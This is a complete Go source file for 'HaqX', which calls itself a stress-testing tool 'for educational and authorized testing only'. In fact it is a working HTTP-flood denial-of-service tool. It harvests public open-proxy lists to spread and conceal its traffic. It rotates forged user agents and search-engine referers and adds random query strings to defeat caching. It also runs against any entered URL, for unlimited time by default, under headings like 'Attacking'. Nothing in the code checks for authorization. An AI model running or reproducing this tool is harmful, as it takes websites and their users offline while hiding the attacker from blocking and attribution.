package main

/*
 HaqX - Advanced Network Stress Testing Tool
 For Educational & Authorized Testing Only
*/

import (
	"bufio"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const VERSION = "3.3.7"
const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
const ACCEPT = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

type (
	Counter struct {
		sync.RWMutex
		Value int64
	}
	
	Metric struct {
		sync.RWMutex
		Total    int64
		Errors   int64
		Codes    map[int]int64
		Started  time.Time
	}
	
	Target struct {
		URL        string
		Connections int
		Timeout    time.Duration
		Rate       int
		Data       string
		Headers    []string
		Agents     []string
		Referers   []string
		Safe       bool
		Verbose    bool
		Duration   int
		Method     string
		Proxy      bool
		Pool       []string
		Index      int
		sync.Mutex
	}
	
	ProxyHunter struct {
		Sources []string
		Cache   []string
		sync.Mutex
	}
	
	Factory struct {
		Clients []*http.Client
		sync.Mutex
		Next int
		Cfg  *Target
	}
	
	Throttle struct {
		Tickets  chan struct{}
		Tick     time.Duration
		sync.Mutex
		Refilled time.Time
		Done     chan struct{}
	}
)

var (
	Stats   *Metric
	Debug   bool
	Secure  bool
)

func init() {
	Stats = &Metric{
		Codes:   make(map[int]int64),
		Started: time.Now(),
	}
}

func NewConfig() *Target {
	return &Target{
		Timeout:    15 * time.Second,
		Rate:       200,
		Connections: 150,
		Duration:   0,
		Method:     "GET",
		Proxy:      true,
		Agents: []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) Version/17.1 Mobile/15E148 Safari/604.1",
			"Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) Version/17.1 Mobile/15E148 Safari/604.1",
			"Mozilla/5.0 (Linux; Android 13; SM-S918B) Chrome/120.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) Chrome/120.0.0.0 Mobile Safari/537.36",
			"curl/8.5.0",
			"Wget/1.21.4",
			"Python-urllib/3.11",
			"Go-http-client/2.0",
			"okhttp/4.12.0",
			"Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Pro Build/UP1A.231105.001)",
		},
		Referers: []string{
			"https://www.google.com/search?q=",
			"https://www.bing.com/search?q=",
			"https://duckduckgo.com/?q=",
			"https://www.reddit.com/search/?q=",
			"https://www.youtube.com/results?search_query=",
			"https://twitter.com/search?q=",
			"https://www.facebook.com/search/top?q=",
			"https://www.instagram.com/explore/search/?q=",
			"https://www.linkedin.com/search/results/all/?keywords=",
			"https://github.com/search?q=",
			"https://stackoverflow.com/search?q=",
			"https://www.tiktok.com/search?q=",
			"https://www.pinterest.com/search/pins/?q=",
			"https://www.tumblr.com/search/",
		},
	}
}

func (t *Target) NextProxy() string {
	t.Lock()
	defer t.Unlock()
	if len(t.Pool) == 0 { return "" }
	proxy := t.Pool[t.Index]
	t.Index = (t.Index + 1) % len(t.Pool)
	return proxy
}

func Hunter() *ProxyHunter {
	return &ProxyHunter{
		Sources: []string{
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000",
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000",
			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
			"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
			"https://www.proxy-list.download/api/v1/get?type=http",
			"https://www.proxy-list.download/api/v1/get?type=socks4",
			"https://www.proxy-list.download/api/v1/get?type=socks5",
			"https://api.openproxylist.xyz/http.txt",
			"https://api.openproxylist.xyz/socks4.txt",
			"https://api.openproxylist.xyz/socks5.txt",
		},
	}
}

func (h *ProxyHunter) Harvest() []string {
	h.Lock()
	defer h.Unlock()
	
	var all []string
	client := &http.Client{
		Timeout: 8 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	
	for _, src := range h.Sources {
		resp, err := client.Get(src)
		if err != nil { continue }
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		
		lines := strings.Split(string(body), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line == "" || strings.HasPrefix(line, "#") { continue }
			if strings.Contains(line, ":") {
				all = append(all, line)
			}
		}
		time.Sleep(300 * time.Millisecond)
	}
	
	// Deduplicate
	seen := make(map[string]bool)
	var unique []string
	for _, p := range all {
		if !seen[p] {
			seen[p] = true
			unique = append(unique, p)
		}
	}
	return unique
}

func BuildFactory(size int, timeout time.Duration, cfg *Target) *Factory {
	pool := &Factory{
		Clients: make([]*http.Client, size),
		Cfg:     cfg,
	}
	for i := 0; i < size; i++ {
		pool.Clients[i] = pool.NewClient()
	}
	return pool
}

func (f *Factory) NewClient() *http.Client {
	tr := &http.Transport{
		MaxIdleConns:        200,
		MaxIdleConnsPerHost: 30,
		MaxConnsPerHost:     30,
		IdleConnTimeout:     120 * time.Second,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives:   false,
		DisableCompression:  false,
		ForceAttemptHTTP2:   true,
	}
	
	if f.Cfg.Proxy && len(f.Cfg.Pool) > 0 {
		proxy := f.Cfg.NextProxy()
		if proxy != "" {
			if p, err := url.Parse(proxy); err == nil {
				tr.Proxy = http.ProxyURL(p)
			}
		}
	}
	
	return &http.Client{Timeout: f.Cfg.Timeout, Transport: tr}
}

func (f *Factory) Acquire() *http.Client {
	f.Lock()
	defer f.Unlock()
	
	if f.Cfg.Proxy && len(f.Cfg.Pool) > 0 {
		return f.NewClient()
	}
	
	client := f.Clients[f.Next]
	f.Next = (f.Next + 1) % len(f.Clients)
	return client
}

func (f *Factory) Release() {
	for _, c := range f.Clients {
		if c.Transport != nil {
			if tr, ok := c.Transport.(*http.Transport); ok {
				tr.CloseIdleConnections()
			}
		}
	}
}

func NewThrottle(rate int) *Throttle {
	if rate <= 0 { return nil }
	
	t := &Throttle{
		Tickets:  make(chan struct{}, rate*3),
		Tick:     time.Second / time.Duration(rate),
		Done:     make(chan struct{}),
		Refilled: time.Now(),
	}
	
	for i := 0; i < rate*3; i++ {
		select {
		case t.Tickets <- struct{}{}:
		default:
		}
	}
	
	go t.Pump()
	return t
}

func (t *Throttle) Pump() {
	ticker := time.NewTicker(t.Tick)
	defer ticker.Stop()
	
	for {
		select {
		case <-t.Done:
			return
		case <-ticker.C:
			t.Lock()
			now := time.Now()
			if now.Sub(t.Refilled) >= t.Tick {
				select {
				case t.Tickets <- struct{}{}:
				default:
				}
				t.Refilled = now
			}
			t.Unlock()
		}
	}
}

func (t *Throttle) Stop() {
	if t != nil {
		close(t.Done)
	}
}

func (t *Throttle) Wait(ctx context.Context) error {
	select {
	case <-t.Tickets:
		return nil
	case <-ctx.Done():
		return ctx.Err()
	}
}

func main() {
	cfg := NewConfig()
	
	var (
		showVer   bool
		agents    string
		custom    arrayFlags
		conns     int
		to        int
		rate      int
		dur       int
		method    string
		noprox    bool
	)

	flag.BoolVar(&showVer, "v", false, "Show version")
	flag.BoolVar(&Secure, "safe", false, "Safe mode")
	flag.BoolVar(&Debug, "debug", false, "Debug mode")
	flag.BoolVar(&noprox, "noprox", false, "Disable proxies")
	flag.StringVar(&agents, "agents", "", "User-agent file")
	flag.StringVar(&cfg.Data, "data", "", "POST data")
	flag.IntVar(&conns, "c", 0, "Connections")
	flag.IntVar(&to, "t", 0, "Timeout seconds")
	flag.IntVar(&rate, "r", 0, "Rate limit")
	flag.IntVar(&dur, "d", 0, "Duration seconds")
	flag.StringVar(&method, "m", "", "HTTP method")
	flag.Var(&custom, "H", "Custom headers")
	flag.Parse()

	if showVer {
		fmt.Printf("HaqX v%s\n", VERSION)
		return
	}

	cfg.Headers = custom
	if conns > 0 { cfg.Connections = conns }
	if to > 0 { cfg.Timeout = time.Duration(to) * time.Second }
	if rate > 0 { cfg.Rate = rate }
	if dur > 0 { cfg.Duration = dur }
	if method != "" { cfg.Method = strings.ToUpper(method) }
	if noprox { cfg.Proxy = false }
	
	Banner()
	fmt.Println("⚙️  Configure attack parameters (Enter for defaults)\n")
	
	reader := bufio.NewReader(os.Stdin)
	
	fmt.Print("🎯 Target URL: ")
	target, _ := reader.ReadString('\n')
	target = strings.TrimSpace(target)
	for target == "" {
		fmt.Print("⚠️  Target required: ")
		target, _ = reader.ReadString('\n')
		target = strings.TrimSpace(target)
	}
	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		target = "http://" + target
	}
	cfg.URL = target
	parsed, err := url.Parse(cfg.URL)
	if err != nil {
		fmt.Printf("❌ Invalid URL: %v\n", err)
		return
	}
	fmt.Printf("✅ Target: %s\n", cfg.URL)

	if cfg.Proxy {
		fmt.Println("\n🌐 Harvesting proxies...")
		hunter := Hunter()
		proxies := hunter.Harvest()
		if len(proxies) > 0 {
			cfg.Pool = proxies
			fmt.Printf("✅ %d proxies ready\n", len(proxies))
		} else {
			fmt.Println("⚠️  No proxies found, continuing without")
			cfg.Proxy = false
		}
	}

	fmt.Printf("\n🔢 Connections [%d]: ", cfg.Connections)
	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
		if v, err := strconv.Atoi(strings.TrimSpace(input)); err == nil && v > 0 {
			cfg.Connections = v
		}
	}
	fmt.Printf("✅ %d\n", cfg.Connections)

	fmt.Printf("\n⏱️  Timeout (s) [%d]: ", int(cfg.Timeout.Seconds()))
	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
		if v, err := strconv.Atoi(strings.TrimSpace(input)); err == nil && v > 0 {
			cfg.Timeout = time.Duration(v) * time.Second
		}
	}
	fmt.Printf("✅ %v\n", cfg.Timeout)

	fmt.Printf("\n🚀 Rate (req/s) [%d]: ", cfg.Rate)
	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
		if v, err := strconv.Atoi(strings.TrimSpace(input)); err == nil && v >= 0 {
			cfg.Rate = v
		}
	}
	fmt.Printf("✅ %d\n", cfg.Rate)

	fmt.Printf("\n📡 Method [%s]: ", cfg.Method)
	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
		m := strings.ToUpper(strings.TrimSpace(input))
		if m == "GET" || m == "POST" { cfg.Method = m }
	}
	fmt.Printf("✅ %s\n", cfg.Method)

	if cfg.Method == "POST" {
		fmt.Print("\n📝 POST data (empty = random): ")
		if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
			cfg.Data = strings.TrimSpace(input)
		} else {
			cfg.Data = RandomData()
			fmt.Printf("✅ Random: %s\n", cfg.Data)
		}
	}

	fmt.Printf("\n⏰ Duration (s, 0=unlimited) [%d]: ", cfg.Duration)
	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
		if v, err := strconv.Atoi(strings.TrimSpace(input)); err == nil && v >= 0 {
			cfg.Duration = v
		}
	}
	if cfg.Duration > 0 {
		fmt.Printf("✅ %d seconds\n", cfg.Duration)
	} else {
		fmt.Println("✅ ♾️  Unlimited")
	}

	fmt.Printf("\n🛡️  Safe mode [%t]: ", Secure)
	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
		if strings.ToLower(strings.TrimSpace(input)) == "y" {
			Secure = true
		} else {
			Secure = false
		}
	}
	fmt.Printf("✅ %t\n", Secure)

	fmt.Print("\n📄 User-agent file: ")
	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
		if data, err := os.ReadFile(strings.TrimSpace(input)); err == nil {
			var list []string
			for _, a := range strings.Split(string(data), "\n") {
				if strings.TrimSpace(a) != "" {
					list = append(list, strings.TrimSpace(a))
				}
			}
			if len(list) > 0 {
				cfg.Agents = list
				fmt.Printf("✅ %d agents loaded\n", len(list))
			}
		}
	}

	fmt.Print("\n📋 Custom headers (key:value, comma separated): ")
	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
		for _, h := range strings.Split(strings.TrimSpace(input), ",") {
			parts := strings.SplitN(strings.TrimSpace(h), ":", 2)
			if len(parts) == 2 {
				cfg.Headers = append(cfg.Headers, strings.TrimSpace(parts[0])+": "+strings.TrimSpace(parts[1]))
			}
		}
		if len(cfg.Headers) > 0 {
			fmt.Printf("✅ %d headers added\n", len(cfg.Headers))
		}
	}

	if agents != "" {
		if data, err := os.ReadFile(agents); err == nil {
			var list []string
			for _, a := range strings.Split(string(data), "\n") {
				if strings.TrimSpace(a) != "" {
					list = append(list, strings.TrimSpace(a))
				}
			}
			if len(list) > 0 {
				cfg.Agents = list
			}
		}
	}

	ShowConfig(cfg)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		fmt.Println("\n⚠️  Interrupted, shutting down...")
		cancel()
	}()

	factory := BuildFactory(20, cfg.Timeout, cfg)
	defer factory.Release()

	var throttle *Throttle
	if cfg.Rate > 0 {
		throttle = NewThrottle(cfg.Rate)
		defer throttle.Stop()
	}

	fmt.Print("\n⚡ Press ENTER to launch or Ctrl+C to abort...")
	reader.ReadString('\n')
	fmt.Println()

	Launch(ctx, cancel, cfg, parsed, factory, throttle)

	ShowStats()
}

func RandomData() string {
	fields := []string{"user", "email", "pass", "name", "msg", "comment", "search", "query", "data", "value", "id", "token"}
	var parts []string
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	for i := 0; i < 5+rng.Intn(5); i++ {
		key := fields[rng.Intn(len(fields))]
		val := RandomString(5+rng.Intn(15), rng)
		parts = append(parts, fmt.Sprintf("%s=%s", key, val))
	}
	return strings.Join(parts, "&")
}

func RandomString(n int, rng *rand.Rand) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = CHARSET[rng.Intn(len(CHARSET))]
	}
	return string(b)
}

func RandomParams(rng *rand.Rand) string {
	n := 2 + rng.Intn(8)
	var parts []string
	for i := 0; i < n; i++ {
		k := RandomString(3+rng.Intn(10), rng)
		v := RandomString(3+rng.Intn(15), rng)
		parts = append(parts, fmt.Sprintf("%s=%s", k, v))
	}
	return strings.Join(parts, "&")
}

func Joiner(u *url.URL) string {
	if u.RawQuery != "" || strings.ContainsRune(u.RawQuery, '?') {
		return "&"
	}
	return "?"
}

func Launch(ctx context.Context, cancel context.CancelFunc, cfg *Target, parsed *url.URL, factory *Factory, throttle *Throttle) {
	var wg sync.WaitGroup
	active := int32(0)
	done := make(chan struct{}, cfg.Connections)
	
	if cfg.Duration > 0 {
		timer := time.NewTimer(time.Duration(cfg.Duration) * time.Second)
		go func() {
			<-timer.C
			fmt.Println("\n⏰ Time's up!")
			cancel()
		}()
	}

	fmt.Printf("🚀 Attacking %s\n", cfg.URL)
	if cfg.Proxy && len(cfg.Pool) > 0 {
		fmt.Printf("🌐 %d proxies active\n", len(cfg.Pool))
	}
	fmt.Printf("⚙️  %d workers | %v timeout | %d req/s\n\n",
		cfg.Connections, cfg.Timeout, cfg.Rate)

	for i := 0; i < cfg.Connections; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			defer func() { done <- struct{}{} }()
			atomic.AddInt32(&active, 1)
			defer atomic.AddInt32(&active, -1)
			Worker(ctx, id, cfg, parsed, factory, throttle)
		}(i)
	}

	monitor := make(chan struct{})
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-monitor:
				return
			case <-ticker.C:
				Stats.RLock()
				sent := Stats.Total
				errs := Stats.Errors
				Stats.RUnlock()
				active := atomic.LoadInt32(&active)
				elapsed := time.Since(Stats.Started).Seconds()
				var rate float64
				if elapsed > 0 {
					rate = float64(sent) / elapsed
				}
				fmt.Printf("\r📊 %d req | ❌ %d err | 🔥 %d active | ⚡ %.1f req/s | ⏱️ %v",
					sent, errs, active, rate, time.Since(Stats.Started).Round(time.Second))
			}
		}
	}()

	wg.Wait()
	close(monitor)
	close(done)
	for range done {}
}

func Worker(ctx context.Context, id int, cfg *Target, parsed *url.URL, factory *Factory, throttle *Throttle) {
	host := parsed.Host
	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
	
	for {
		select {
		case <-ctx.Done():
			return
		default:
			if throttle != nil {
				if err := throttle.Wait(ctx); err != nil {
					return
				}
			}
			
			client := factory.Acquire()
			if err := Fire(ctx, client, cfg, parsed, host, rng); err != nil {
				if Debug {
					fmt.Printf("\n🔴 Worker %d: %v\n", id, err)
				}
				atomic.AddInt64(&Stats.Errors, 1)
			} else {
				atomic.AddInt64(&Stats.Total, 1)
			}
		}
	}
}

func Fire(ctx context.Context, client *http.Client, cfg *Target, parsed *url.URL, host string, rng *rand.Rand) error {
	var req *http.Request
	var err error
	
	for attempt := 0; attempt < cfg.Connections/10+1; attempt++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
			if cfg.Method == "POST" {
				var body io.Reader
				if cfg.Data != "" {
					body = strings.NewReader(cfg.Data)
				} else {
					body = strings.NewReader(RandomData())
				}
				req, err = http.NewRequestWithContext(ctx, "POST", cfg.URL, body)
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else {
				params := RandomParams(rng)
				full := fmt.Sprintf("%s%s%s", cfg.URL, Joiner(parsed), params)
				req, err = http.NewRequestWithContext(ctx, "GET", full, nil)
			}
			
			if err != nil {
				return err
			}
			
			Arm(req, cfg, host, rng)
			
			resp, err := client.Do(req)
			if err != nil {
				if attempt < 3 {
					time.Sleep(time.Duration(100*(1<<uint(attempt))) * time.Millisecond)
					continue
				}
				return err
			}
			defer resp.Body.Close()
			
			io.Copy(io.Discard, resp.Body)
			
			Stats.Lock()
			Stats.Codes[resp.StatusCode]++
			Stats.Unlock()
			
			if Secure && resp.StatusCode >= 500 {
				if Debug {
					fmt.Printf("\n⚠️  %d from server\n", resp.StatusCode)
				}
				return fmt.Errorf("server error %d", resp.StatusCode)
			}
			
			return nil
		}
	}
	
	return fmt.Errorf("exhausted retries")
}

func Arm(req *http.Request, cfg *Target, host string, rng *rand.Rand) {
	ua := cfg.Agents[rng.Intn(len(cfg.Agents))]
	req.Header.Set("User-Agent", ua)
	
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Charset", ACCEPT)
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	
	if len(cfg.Referers) > 0 {
		ref := cfg.Referers[rng.Intn(len(cfg.Referers))] + RandomString(5+rng.Intn(10), rng)
		req.Header.Set("Referer", ref)
	}
	
	req.Header.Set("Keep-Alive", strconv.Itoa(100+rng.Intn(20)))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", host)
	
	if rng.Intn(2) == 0 {
		req.Header.Set("DNT", "1")
	}
	if rng.Intn(3) == 0 {
		req.Header.Set("Upgrade-Insecure-Requests", "1")
	}
	
	for _, h := range cfg.Headers {
		parts := strings.SplitN(h, ":", 2)
		if len(parts) == 2 {
			req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
		}
	}
}

func Banner() {
	fmt.Println("\033[97m" + ` ██░ ██  ▄▄▄       ██▓ ▄▄▄██▀▀▀
▓██░ ██▒▒████▄    ▓██▒   ▒██   
▒██▀▀██░▒██  ▀█▄  ▒██▒   ░██   
░▓█ ░██ ░██▄▄▄▄██ ░██░▓██▄██▓  
░▓█▒░██▓ ▓█   ▓██▒░██░ ▓███▒   
 ▒ ░░▒░▒ ▒▒   ▓▒█░░▓   ▒▓▒▒░   
 ▒ ░▒░ ░  ▒   ▒▒ ░ ▒ ░ ▒ ░▒░   
 ░  ░░ ░  ░   ▒    ▒ ░ ░ ░ ░   
 ░  ░  ░      ░  ░ ░   ░   ░   
` + "\033[0m")
	fmt.Println("\033[97m" + "🔥 HaqX v" + VERSION + " ⚡" + "\033[0m")
	fmt.Println("\033[97m" + "Educational & Authorized Testing Only" + "\033[0m")
	fmt.Println()
}

func ShowConfig(cfg *Target) {
	fmt.Println()
	fmt.Println("📋 Attack Configuration")
	fmt.Printf("  🎯 Target:  %s\n", cfg.URL)
	fmt.Printf("  🔢 Workers: %d\n", cfg.Connections)
	fmt.Printf("  ⏱️  Timeout: %v\n", cfg.Timeout)
	fmt.Printf("  🚀 Rate:    %d req/s\n", cfg.Rate)
	fmt.Printf("  📡 Method:  %s\n", cfg.Method)
	if cfg.Method == "POST" && cfg.Data != "" {
		fmt.Printf("  📝 Data:    %s\n", cfg.Data)
	}
	if cfg.Duration > 0 {
		fmt.Printf("  ⏰ Time:    %d seconds\n", cfg.Duration)
	} else {
		fmt.Printf("  ⏰ Time:    ♾️  Unlimited\n")
	}
	fmt.Printf("  🛡️  Safe:    %t\n", Secure)
	fmt.Printf("  📄 Agents:  %d\n", len(cfg.Agents))
	if cfg.Proxy && len(cfg.Pool) > 0 {
		fmt.Printf("  🌐 Proxies: %d\n", len(cfg.Pool))
	} else {
		fmt.Printf("  🌐 Proxies: ❌\n")
	}
	if len(cfg.Headers) > 0 {
		fmt.Printf("  📋 Headers: %d\n", len(cfg.Headers))
	}
	fmt.Println()
}

func ShowStats() {
	Stats.RLock()
	defer Stats.RUnlock()
	
	duration := time.Since(Stats.Started).Round(time.Second)
	total := Stats.Total + Stats.Errors
	var rate float64
	if total > 0 {
		rate = float64(Stats.Total) / float64(total) * 100
	}
	
	fmt.Println()
	fmt.Println("📊 Final Statistics")
	fmt.Printf("  ✅ Success:  %d\n", Stats.Total)
	fmt.Printf("  ❌ Errors:   %d\n", Stats.Errors)
	fmt.Printf("  📈 Rate:     %.2f%%\n", rate)
	fmt.Printf("  ⏱️  Duration:  %v\n", duration)
	
	if duration.Seconds() > 0 {
		fmt.Printf("  🚀 Req/s:    %.2f\n", float64(Stats.Total)/duration.Seconds())
	}
	
	fmt.Println()
	fmt.Println("  📋 Status Codes:")
	if len(Stats.Codes) > 0 {
		for code, count := range Stats.Codes {
			fmt.Printf("    %d: %d\n", code, count)
		}
	} else {
		fmt.Println("    ❌ None recorded")
	}
	fmt.Println()
}

type arrayFlags []string

func (a *arrayFlags) String() string {
	return strings.Join(*a, ", ")
}

func (a *arrayFlags) Set(value string) error {
	*a = append(*a, value)
	return nil
}
